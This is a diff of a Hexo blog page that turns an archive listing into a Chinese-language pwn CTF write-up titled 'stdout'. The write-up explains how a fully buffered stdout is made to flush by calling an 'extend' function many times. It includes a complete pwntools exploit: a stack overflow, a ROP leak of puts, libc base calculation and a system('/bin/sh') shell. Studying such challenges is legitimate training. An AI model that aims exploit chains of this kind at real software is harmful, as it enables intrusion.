@@ -6,17 +6,30 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives: 2024 | Hexo</title>
+  <title>stdout | Hexo</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/archives/2024/page/2/index.html">
+  <meta name="description" content="这里stdout第三个参数是0，就是标准输出全缓冲，缓冲区被填满才能进行回显 刷新缓冲区有几种办法  能够溢出8字节  一个没什么用的函数  那么只能将缓冲区填满，刚开始想的是用vuln函数不断输入  ret的操作是pop rip，rsp&#x3D;rsp+8, 指向0x0x7fff153a5588.  endbr64指令rsp是不动的，push rbp后rbp变成了原来返回地址的位置,再次调用相">
+<meta property="og:type" content="article">
+<meta property="og:title" content="stdout">
+<meta property="og:url" content="http://example.com/2024/09/21/stdout/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="这里stdout第三个参数是0，就是标准输出全缓冲，缓冲区被填满才能进行回显 刷新缓冲区有几种办法  能够溢出8字节  一个没什么用的函数  那么只能将缓冲区填满，刚开始想的是用vuln函数不断输入  ret的操作是pop rip，rsp&#x3D;rsp+8, 指向0x0x7fff153a5588.  endbr64指令rsp是不动的，push rbp后rbp变成了原来返回地址的位置,再次调用相">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922190505843.png">
+<meta property="og:image" content="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922190659808.png">
+<meta property="og:image" content="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922190726730.png">
+<meta property="og:image" content="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922202629304.png">
+<meta property="og:image" content="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922202708003.png">
+<meta property="og:image" content="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922203434985.png">
+<meta property="og:image" content="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922210006385.png">
+<meta property="og:image" content="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922205219910.png">
+<meta property="article:published_time" content="2024-09-21T14:44:34.000Z">
+<meta property="article:modified_time" content="2024-09-22T13:51:20.983Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922190505843.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -199,346 +212,250 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-stdout" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2024" class="archive-year">2024</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/04/11/ciscn-final-5/" class="archive-article-date">
-        <time datetime="2024-04-11T11:36:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-04-11</time>
-</a>
-
-        </div>
-    	 
+      <header class="article-header">
   
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/04/11/ciscn-final-5/" target="_blank">ciscn_final_5</a>
   
+    <h1 class="article-title" itemprop="name">
+      stdout
     </h1>
   
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/03/23/GUESS/" class="archive-article-date">
-        <time datetime="2024-03-23T10:34:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-23</time>
+  
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
+<a href="/2024/09/21/stdout/" class="archive-article-date">
+        <time datetime="2024-09-21T14:44:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-09-21</time>
 </a>
 
+  
+  
+    
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">405字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">1分</span>
+    </span>
+  </span>
+</div>
+
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>这里stdout第三个参数是0，就是标准输出全缓冲，缓冲区被填满才能进行回显</p>
+<p>刷新缓冲区有几种办法</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922190505843.png" alt="image-20240922190505843"></p>
+<p>能够溢出8字节</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922190659808.png" alt="image-20240922190659808"></p>
+<p>一个没什么用的函数</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922190726730.png" alt="image-20240922190726730"></p>
+<p>那么只能将缓冲区填满，刚开始想的是用vuln函数不断输入</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922202629304.png" alt="image-20240922202629304"></p>
+<p>ret的操作是pop rip，rsp&#x3D;rsp+8, 指向0x0x7fff153a5588.  endbr64指令rsp是不动的，push rbp后rbp变成了原来返回地址的位置,再次调用相同的输入也只是让rbp+8,即每次</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">	payload=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x28</span>+p64(vul)</span><br><span class="line">	p.send(payload)</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
+
+<p>也只是让rbp+8移动</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922202708003.png" alt="image-20240922202708003"></p>
+<p>第二次的rbp</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922203434985.png" alt="image-20240922203434985"></p>
+<p>只是调用vuln的话时不会回显的。</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922210006385.png" alt="image-20240922210006385"></p>
+<p>其实不是理想当然的填充，得调用extend函数填充缓冲区。那么就只能不断调用extend函数把缓冲区填满。</p>
+<p>调用extend时第二十次时的栈</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922205219910.png" alt="image-20240922205219910"></p>
+<p>exp</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,)</span></span><br><span class="line">p=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">extend=<span class="number">0x401287</span></span><br><span class="line">vul=<span class="number">0x40125D</span></span><br><span class="line">pop_rdi=<span class="number">0x4013d3</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>+p64(vul)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">payload=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(puts_got)+p64(puts)+p64(extend)+p64(vul)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>):</span><br><span class="line">	payload=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x28</span>+p64(extend)+p64(vul)</span><br><span class="line">	p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;stdout???&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">base=puts_addr-<span class="number">0x10dfc0</span> <span class="comment">#libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line">system=base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh=base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;bin/sh&#x27;</span>))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;put&#x27;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    
+
+    
+    <div class="page-reward">
+      <a href="javascript:void(0);" class="page-reward-btn tooltip-top" target="_self">
+        <div class="tooltip tooltip-east">
+          <span class="tooltip-item">
+            赏
+          </span>
+          <span class="tooltip-content">
+            <span class="tooltip-text">
+              <span class="tooltip-inner">
+                <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i
+                    class="icon icon-quo-right"></i></p>
+                <div class="reward-box">
+                  
+                  
+                </div>
+              </span>
+            </span>
+          </span>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/03/23/GUESS/" target="_blank">GUESS</a>
-  
-    </h1>
-  
+      </a>
+    </div>
+    
 
-
-        <div class="article-info info-on-right">
+    
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          John Doe
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="http://example.com/2024/09/21/stdout/" title="stdout" target="_blank">http://example.com/2024/09/21/stdout/</a>
+        </li>
+        
+        <li>
+          <strong>版权声明： </strong>
           
-          
+          本博客所有文章除特别声明外，均采用 <a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/blob/master/LICENSE" rel="external nofollow" target="_blank">MIT</a> 许可协议。转载请注明出处！
+        </li>
+        
+      </ul>
+    </div>
+    
 
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+
+    
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2024/09/21/stdout/" alt="微信分享二维码"> -->
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+
+    
+    <div class="clearfix"></div>
+  </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/03/22/bad/" class="archive-article-date">
-        <time datetime="2024-03-22T06:08:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-22</time>
-</a>
 
+
+<nav id="article-nav">
+  
+  
+    <a href="/2024/09/18/%E8%A7%A3%E5%86%B3libc6%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%92%8Clibc6-dev%E4%B8%8D%E5%8C%B9%E9%85%8D%E7%9A%84%E9%97%AE%E9%A2%98/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">解决libc6软件包和libc6-dev不匹配的问题</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/03/22/bad/" target="_blank">bad</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    目录，不存在的…
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/03/20/b0verfl0w/" class="archive-article-date">
-        <time datetime="2024-03-20T15:07:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-20</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/03/20/b0verfl0w/" target="_blank">b0verfl0w</a>
-  
-    </h1>
-  
+        
+    </div>
+</aside>
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/03/18/roarctf-2019-easy-pwn/" class="archive-article-date">
-        <time datetime="2024-03-18T15:03:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-18</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/03/18/roarctf-2019-easy-pwn/" target="_blank">roarctf_2019_easypwn</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/03/18/ciscn-2019-es-7/" class="archive-article-date">
-        <time datetime="2024-03-18T13:09:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-18</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/03/18/ciscn-2019-es-7/" target="_blank">ciscn_2019_es_7</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/03/16/hitcon2014-stkof/" class="archive-article-date">
-        <time datetime="2024-03-16T14:10:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-16</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/03/16/hitcon2014-stkof/" target="_blank">hitcon2014_stkof</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/03/14/inndy-rop/" class="archive-article-date">
-        <time datetime="2024-03-14T11:42:22.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-14</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/03/14/inndy-rop/" target="_blank">inndy_rop</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/03/14/level4/" class="archive-article-date">
-        <time datetime="2024-03-14T06:50:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-14</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/03/14/level4/" target="_blank">level4</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2024/03/13/babyheap-0ctf-2017/" class="archive-article-date">
-        <time datetime="2024-03-13T11:11:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-13</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2024/03/13/babyheap-0ctf-2017/" target="_blank">babyheap_0ctf_2017</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/2024/">&amp;laquo; Prev</a><a class="page-number" href="/archives/2024/">1</a><span class="page-number current">2</span><a class="page-number" href="/archives/2024/page/3/">3</a><a class="page-number" href="/archives/2024/page/4/">4</a><a class="extend next" rel="next" href="/archives/2024/page/3/">Next &amp;raquo;</a>
-    </nav>
-  
 
 
           </div>
@@ -579,8 +496,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: true,
